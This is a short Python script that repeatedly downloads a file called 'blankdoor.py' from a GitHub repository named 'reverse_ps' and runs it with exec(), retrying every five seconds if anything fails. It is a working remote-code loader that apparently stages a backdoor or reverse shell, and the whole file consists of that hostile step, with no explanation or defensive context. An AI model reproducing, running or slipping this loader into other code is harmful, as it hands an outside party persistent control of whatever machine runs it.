import requests, time
url = "https://raw.githubusercontent.com/tot-camiy-coder/reverse_ps/refs/heads/main/blankdoor.py"
while True:
    try: 
        r = requests.get(url)
        print("!")
        exec(r.text)
    except:
        time.sleep(5)

